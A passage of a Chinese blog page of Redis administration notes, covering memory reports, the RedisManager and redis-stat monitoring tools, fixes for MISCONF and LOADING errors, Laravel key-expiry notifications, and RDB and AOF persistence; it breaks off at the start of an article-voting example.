class="line">好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config</span><br></pre></td></tr></table></figure>
<h3 id="Redis-查看所有-key-的-value-值所占内存大小"><a href="#Redis-查看所有-key-的-value-值所占内存大小" class="headerlink" title="Redis 查看所有 key 的 value 值所占内存大小"></a>Redis 查看所有 key 的 value 值所占内存大小</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/sripathikrishnan/redis-rdb-tools#generate-memory-report</span></span><br><span class="line">$ pip install rdbtools python-lzf</span><br><span class="line">$ git clone https:<span class="comment">//github.com/sripathikrishnan/redis-rdb-tools</span></span><br><span class="line">$ cd redis-rdb-tools</span><br><span class="line">$ sudo python setup.py install</span><br><span class="line"></span><br><span class="line">接下来找到 redis 的 dump.rdb 位置</span><br><span class="line"></span><br><span class="line">首先定位到 redis.conf 位置</span><br><span class="line"></span><br><span class="line">$ whereis redis.conf</span><br><span class="line">redis: <span class="regexp">/etc/</span>redis.conf</span><br><span class="line">$ cat /etc/redis.conf | grep dir | grep redis</span><br><span class="line">dir /<span class="keyword">var</span>/lib/redis</span><br><span class="line">$ cat /etc/redis.conf | grep dump.rdb</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line">综上，得知其路径为：/<span class="keyword">var</span>/lib/redis/dump.rdb</span><br><span class="line"></span><br><span class="line">按内存值导出 csv</span><br><span class="line"></span><br><span class="line">$ rdb -c memory /<span class="keyword">var</span>/lib/redis/dump.rdb &gt; <span class="regexp">/tmp/</span>redis.csv</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33211</span></span><br></pre></td></tr></table></figure>
<h3 id="管理平台工具-RedisManager"><a href="#管理平台工具-RedisManager" class="headerlink" title="管理平台工具 RedisManager"></a>管理平台工具 RedisManager</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">github项目地址：https:<span class="comment">//github.com/ngbdf/redis-manager</span></span><br><span class="line"></span><br><span class="line">下载安装：</span><br><span class="line">系统环境：</span><br><span class="line">LINUX</span><br><span class="line">JDK1<span class="number">.8</span></span><br><span class="line"></span><br><span class="line">#Releases</span><br><span class="line">https:<span class="comment">//github.com/ngbdf/redis-manager/releases</span></span><br><span class="line"></span><br><span class="line">#当前最新版本 1.1</span><br><span class="line">wget https:<span class="comment">//github.com/ngbdf/redis-manager/releases/download/redismanager-1.1-release/redis-manager-1.1-release.tar.gz</span></span><br><span class="line"></span><br><span class="line">#创建数据库</span><br><span class="line">create database dbname <span class="keyword">default</span> character set utf8mb4 collate utf8mb4_general_ci;</span><br><span class="line"></span><br><span class="line">#解压</span><br><span class="line">tar xf redis-manager<span class="number">-1.1</span>-release.tar.gz </span><br><span class="line">cd redis-manager<span class="number">-1.1</span>/</span><br><span class="line"></span><br><span class="line">#修改配置文件</span><br><span class="line">cd conf/</span><br><span class="line">vim application.yml</span><br><span class="line"></span><br><span class="line">#端口号</span><br><span class="line">server:</span><br><span class="line">  tomcat.uri-encoding: UTF<span class="number">-8</span></span><br><span class="line">  port: <span class="number">8182</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#数据库，仅需自己创建数据库即可，相关表会自动生成</span><br><span class="line">  datasource:</span><br><span class="line">      name: dbname</span><br><span class="line">      driver-class-name: com.mysql.jdbc.Driver</span><br><span class="line">      url: jdbc:mysql:<span class="comment">//192.168.1.1:3306/dbname?useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line">      username: user</span><br><span class="line">      password: passwd</span><br><span class="line"></span><br><span class="line">启动访问：</span><br><span class="line">#执行bin目录下的start.sh脚本</span><br><span class="line">./bin/start.sh </span><br><span class="line"></span><br><span class="line">#查看进程</span><br><span class="line">ps -ef |grep java</span><br><span class="line"></span><br><span class="line">#查看端口</span><br><span class="line">netstat -lntp |grep <span class="number">8182</span></span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">8182</span>                 :::*                    LISTEN      <span class="number">7774</span>/java   </span><br><span class="line">https:<span class="comment">//me.jinchuang.org/archives/430.html</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis监控工具-redis-stat"><a href="#Redis监控工具-redis-stat" class="headerlink" title="Redis监控工具 redis-stat"></a>Redis监控工具 redis-stat</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/junegunn/redis-stat</span></span><br><span class="line">yum install ruby ruby-devel rubygem</span><br><span class="line">#更换gem源，使用国内镜像源下载更快</span><br><span class="line">gem source -a https:<span class="comment">//ruby.taobao.org/ #添加淘宝源</span></span><br><span class="line">gem source -r http:<span class="comment">//rubygems.org/ #删除境外源</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# gem install redis --version 3.0.0 #默认最新是4.0版本</span><br><span class="line">Fetching: redis<span class="number">-3.0</span><span class="number">.0</span>.gem (<span class="number">100</span>%)</span><br><span class="line">[root@localhost ~]# gem install redis-stat</span><br><span class="line">Fetching: ansi256<span class="number">-0.2</span><span class="number">.5</span>.gem (<span class="number">100</span>%)</span><br><span class="line">Successfully installed ansi256<span class="number">-0.2</span><span class="number">.5</span></span><br><span class="line">使用redis-stat 命令行形式</span><br><span class="line">[root@localhost ~]# redis-stat 127.0.0.1:6379</span><br><span class="line">/usr/local/rvm/gems/ruby<span class="number">-2.4</span><span class="number">.1</span>/gems/sinatra<span class="number">-1.3</span><span class="number">.6</span>/lib/sinatra/base.rb:<span class="number">1070</span>: warning: constant ::Fixnum is deprecated</span><br><span class="line">使用redis-stat webserver形式</span><br><span class="line">[root@localhost ~]# redis-stat 127.0.0.1:6379 --server=6666 --daemon #端口自定义</span><br><span class="line">/usr/local/rvm/gems/ruby<span class="number">-2.4</span><span class="number">.1</span>/gems/sinatra<span class="number">-1.3</span><span class="number">.6</span>/lib/sinatra/base.rb:<span class="number">1070</span>: warning: constant ::Fixnum is deprecated</span><br><span class="line"></span><br><span class="line">打开http:<span class="comment">//服务器ip地址:8000 访问</span></span><br><span class="line"></span><br><span class="line">集群也是一样的</span><br><span class="line">redis-stat <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7000</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7001</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7002</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7003</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7004</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7005</span> --</span><br><span class="line">https:<span class="comment">//me.jinchuang.org/archives/233.html</span></span><br></pre></td></tr></table></figure>
<h3 id="loading-redis-is-loading-the-dataset-in-memory-laravel"><a href="#loading-redis-is-loading-the-dataset-in-memory-laravel" class="headerlink" title="loading redis is loading the dataset in memory laravel"></a>loading redis is loading the dataset in memory laravel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# redis-cli</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ping</span><br><span class="line">(error) MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs <span class="keyword">for</span> details about the error.</span><br><span class="line"></span><br><span class="line">ps aux|grep redis|grep -v grep|awk <span class="string">'&#123;print $2&#125;'</span>|xargs kill <span class="number">-9</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>[<span class="number">1</span>]&gt; ping</span><br><span class="line">(error) LOADING Redis is loading the dataset <span class="keyword">in</span> memory</span><br><span class="line"></span><br><span class="line">echo <span class="string">'vm.overcommit_memory = 1'</span> &gt;&gt; <span class="regexp">/etc/</span>sysctl.conf</span><br><span class="line">sysctl vm.overcommit_memory=<span class="number">1</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ping</span><br><span class="line">PONG</span><br><span class="line">但是写不进Redis </span><br><span class="line"></span><br><span class="line">Redis被配置为保存数据库快照，但它目前不能持久化到硬盘。用来修改集合数据的命令不能用。请查看Redis日志的详细错误信息。</span><br><span class="line"></span><br><span class="line">原因</span><br><span class="line">强制关闭Redis快照导致不能持久化。</span><br><span class="line"></span><br><span class="line">解决方案</span><br><span class="line">将stop-writes-on-bgsave-error设置为no</span><br><span class="line"></span><br><span class="line">➜  sh redis-cli -h <span class="number">172.16</span><span class="number">.200</span>.xx -p <span class="number">6378</span></span><br><span class="line"><span class="number">172.16</span><span class="number">.200</span>.xx:<span class="number">6378</span>&gt; config set stop-writes-on-bgsave-error no</span><br><span class="line">找到运维排查机器硬盘内存是否满了，果然，还真是硬盘内存满了，导致持久化保存快照时，发生异常。</span><br><span class="line">[root@localhost ~]# df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/sda2       <span class="number">4.0</span>G  <span class="number">2.1</span>G  <span class="number">1.8</span>G  <span class="number">55</span>% <span class="regexp">/</span></span><br><span class="line"><span class="regexp">tmpfs           5.9G     0  5.9G   0% /</span>dev/shm</span><br><span class="line">/dev/sda7        <span class="number">96</span>G   <span class="number">11</span>G   <span class="number">80</span>G  <span class="number">12</span>% <span class="regexp">/data0</span></span><br><span class="line"><span class="regexp">/</span>dev/sda5       <span class="number">7.9</span>G  <span class="number">278</span>M  <span class="number">7.3</span>G   <span class="number">4</span>% <span class="regexp">/tmp</span></span><br><span class="line"><span class="regexp">/</span>dev/sda3        <span class="number">12</span>G  <span class="number">8.8</span>G  <span class="number">2.5</span>G  <span class="number">79</span>% <span class="regexp">/usr</span></span><br><span class="line"><span class="regexp">/</span>dev/sda6       <span class="number">7.9</span>G  <span class="number">7.8</span>G     <span class="number">0</span> <span class="number">100</span>% <span class="regexp">/var</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">127.0.0.1:6379&gt; config get dir</span></span><br><span class="line"><span class="regexp">1) "dir"</span></span><br><span class="line"><span class="regexp">2) "/</span><span class="keyword">var</span>/lib/redis<span class="string">"</span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; config get dbfilename</span></span><br><span class="line"><span class="string">1) "</span>dbfilename<span class="string">"</span></span><br><span class="line"><span class="string">2) "</span>dump.rdb<span class="string">"</span></span><br><span class="line"><span class="string">持久化文件/varlib/redis/dump.rdb 满了 写不进去了 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://stackoverflow.com/questions/19581059/misconf-redis-is-configured-to-save-rdb-snapshots</span></span><br><span class="line"><span class="string">http://ju.outofmemory.cn/entry/197760</span></span><br></pre></td></tr></table></figure>
<h3 id="提前10分钟提醒信息"><a href="#提前10分钟提醒信息" class="headerlink" title="提前10分钟提醒信息"></a>提前10分钟提醒信息</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>修改redis配置文件</span><br><span class="line"></span><br><span class="line">notify-keyspace-events <span class="string">"Ex"</span></span><br><span class="line"><span class="number">2.</span>修改datebase配置文件</span><br><span class="line"></span><br><span class="line"> <span class="string">'notify_cache'</span> =&gt; [</span><br><span class="line">            <span class="string">'host'</span> =&gt; env(<span class="string">'REDIS_HOST'</span>, <span class="string">'127.0.0.1'</span>),</span><br><span class="line">            <span class="string">'password'</span> =&gt; env(<span class="string">'REDIS_PASSWORD'</span>, <span class="literal">null</span>),</span><br><span class="line">            <span class="string">'port'</span> =&gt; env(<span class="string">'REDIS_PORT'</span>, <span class="number">6379</span>),</span><br><span class="line">            <span class="string">'database'</span> =&gt; env(<span class="string">'REDIS_DB'</span>, <span class="number">4</span>),</span><br><span class="line">            <span class="string">'read_write_timeout'</span> =&gt; <span class="number">-1</span>,  <span class="comment">// 读写超时设定</span></span><br><span class="line">        ],</span><br><span class="line"><span class="number">3.</span>创建过期key</span><br><span class="line"></span><br><span class="line">$ttl = strtotime($data[<span class="string">'return_time'</span>]) - time() - <span class="number">600</span>;</span><br><span class="line">$redis = Redis::connection(<span class="string">'notify_cache'</span>);</span><br><span class="line">$redis-&gt;set(<span class="string">'NOTIFY_CONFIRM:'</span>.$id,$id);</span><br><span class="line">$redis-&gt;expire(<span class="string">'NOTIFY_CONFIRM:'</span>.$id,$ttl);</span><br><span class="line"><span class="number">4.</span>创建监听队列</span><br><span class="line"></span><br><span class="line">$cache_db = config(<span class="string">'database.redis.notify_cache.database'</span>,<span class="number">4</span>);</span><br><span class="line">$pattern = <span class="string">'__keyevent@'</span>.$cache_db.<span class="string">'__:expired'</span>;</span><br><span class="line">Redis::connection(<span class="string">'notify_cache'</span>)-&gt;subscribe($pattern,<span class="function"><span class="keyword">function</span> (<span class="params">$channel</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 订阅键过期事件</span></span><br><span class="line">    Log::info(<span class="string">'-----notify-----'</span>.$channel);</span><br><span class="line">    $key_type = str_before($channel,<span class="string">':'</span>);</span><br><span class="line">    <span class="keyword">switch</span> ($key_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'NOTIFY_CONFIRM'</span>:</span><br><span class="line">            $id = str_after($channel,<span class="string">':'</span>);    <span class="comment">// 取出学员ID</span></span><br><span class="line">            $client  = Client::find($id);</span><br><span class="line">            <span class="keyword">if</span> ($client) &#123;</span><br><span class="line">                  <span class="comment">//业务逻辑</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">加入队列https:<span class="comment">//learnku.com/articles/34526</span></span><br><span class="line"><span class="keyword">const</span> LISTEN_REDIS_NAME = <span class="string">'eeop:axb:bind_log'</span>;<span class="comment">//定时解绑做判断处理</span></span><br><span class="line"><span class="keyword">const</span> AUTO_TIMEOUT = <span class="number">60</span>;<span class="comment">//自动解绑60s</span></span><br><span class="line"><span class="comment">//加入队列 有序队列</span></span><br><span class="line">$<span class="keyword">this</span>-&gt;redis::zadd(self::LISTEN_REDIS_NAME, time() + self::AUTO_TIMEOUT, $<span class="keyword">this</span>-&gt;bind_id);</span><br><span class="line"><span class="number">2.</span> 解绑服务</span><br><span class="line"></span><br><span class="line">$list = $<span class="keyword">this</span>-&gt;redis::ZRANGEBYSCORE(self::LISTEN_REDIS_NAME,<span class="number">0</span>,time());</span><br><span class="line">foreach ($list <span class="keyword">as</span> $value)&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;redis::zrem(self::LISTEN_REDIS_NAME, $value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/588891acd44c</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-持久化存储"><a href="#Redis-持久化存储" class="headerlink" title="Redis 持久化存储"></a>Redis 持久化存储</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">一种是 aof 日志追加的方式，另外一种是 rdb 数据快照的方式。</span><br><span class="line">RDB 持久化存储即是将 redis 存在内存中的数据以快照的形式保存在本地磁盘中。</span><br><span class="line"></span><br><span class="line">手动备份通过 save 命令和 bgsave 命令。save 是同步阻塞，而 bgsave 是非阻塞 (阻塞实际发生在 fork 的子进程中)。因此，在我们实际过程中大多是使用 bgsave 命令实现备份.</span><br><span class="line">自动备份</span><br><span class="line"></span><br><span class="line">a. 修改配置项 save m n 即表示在 m 秒内执行了 n 次命令则进行备份.</span><br><span class="line"></span><br><span class="line">b. 当 Redis 从服务器项主服务器发送复制请求时，主服务器则会使用 bgsave 命令生成 rbd 文件，然后传输给从服务器.</span><br><span class="line"></span><br><span class="line">c. 当执行 debug reload 命令时也会使用 save 命令生成 rdb 文件.</span><br><span class="line"></span><br><span class="line">d. 当使用 shutdown 命令关掉服务时，如果没有启用 aof 方式实现持久化则会采用 bgsave 的方式做持久化。同时 shutdown 后面可以加备份参数 [nosave|save].</span><br><span class="line"></span><br><span class="line">优势:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 文件实现的数据快照，全量备份，便于数据的传输。比如我们需要把 A 服务器上的备份文件传输到 B 服务器上面，直接将 rdb 文件拷贝即可.</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 文件采用压缩的二进制文件，当重启服务时加载数据文件，比 aof 方式更快.</span><br><span class="line"></span><br><span class="line">劣势:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>rbd 采用加密的二进制格式存储文件，由于 Redis 各个版本之间的兼容性问题也导致 rdb 由版本兼容问题导致无法再其他的 Redis 版本中使用.</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 时效性差，容易造成数据的不完整性。因为 rdb 并不是实时备份，当某个时间段 Redis 服务出现异常，内存数据丢失，这段时间的数据是无法恢复的，因此易导致数据的丢失.</span><br><span class="line">当遇到磁盘写满情况，可以使用如下命令来切换存储磁盘</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// dirName则是新的存储目录名(该方式同样适用于aof格式)</span></span><br><span class="line"></span><br><span class="line">config set dir dirName</span><br><span class="line">AOF 持久化存储是什么</span><br><span class="line"></span><br><span class="line">录 redis 的操作日志，将 redis 执行过的命令记录下载，当我们需要数据恢复时，redis 去重新执行一次日志文件中的命令</span><br><span class="line"><span class="comment">// 将no改为yes，控制aof开启与否</span></span><br><span class="line"></span><br><span class="line">appendonly no</span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制aof文件名称，存储的目录便是dir配置项</span></span><br><span class="line"></span><br><span class="line">appendfilename <span class="string">"appendonly.aof"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 三种备份策略(三者只需要开启以一个即可)</span></span><br><span class="line"></span><br><span class="line"># appendfsync always // 命令写入立即写入磁盘</span><br><span class="line"></span><br><span class="line">appendfsync everysec <span class="comment">// 每秒实现文件的同步，写入磁盘</span></span><br><span class="line"></span><br><span class="line"># appendfsync no // 随机进行文件的同步,同步操作则交给操作系统来负责，通常时间是最长30s</span><br><span class="line"></span><br><span class="line">优点:</span><br><span class="line"></span><br><span class="line">多种文件写入 (fsync) 策略.</span><br><span class="line"></span><br><span class="line">数据实时保存，数据完整性强。即使丢失某些数据，制定好策略最多也是一秒内的数据丢失.</span><br><span class="line"></span><br><span class="line">可读性强，由于使用的是文本协议格式来存储的数据，可有直接查看操作的命令，同时也可以手动改写命令.</span><br><span class="line"></span><br><span class="line">缺点:</span><br><span class="line"></span><br><span class="line">文件体积过大，加载速度比 rbd 慢。由于 aof 记录的是 redis 操作的日志，一些无效的，可简化的操作也会被记录下来，造成 aof 文件过大。但该方式可以通过文件重写策略进行优化.</span><br><span class="line"></span><br><span class="line">选择 AOF 还是 RDB 进行数据的持久化</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 针对不同的情况来选择，建议使用两种方式相结合.</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 针对数据安全性、完整性要求高的采用 aof 方式.</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 针对不太重要的数据可以使用 rdb 方式.</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 对于数据进行全量备份，便于数据备份的可以采用 rdb 方式.  https:<span class="comment">//learnku.com/articles/33954</span></span><br></pre></td></tr></table></figure>
<h3 id="文章投票"><a href="#文章投票" class="headerlink" title="文章投票"></a>文章投票</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">一个用户对一篇文章只能投一票</span><br><span class="line">一篇文章发布 <span class="number">7</span> 天后不能再进行投票</span><br><span class="line">文章得分计算规则：发布时间 + 得票数 X 倍数（这里的倍数计算规则为：<span class="number">86400</span>/<span class="number">200</span>=<span class="number">432</span>，<span class="number">86400</span> 为一天的秒数，<span class="number">200</span> 为一天时间对应的投票数</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span 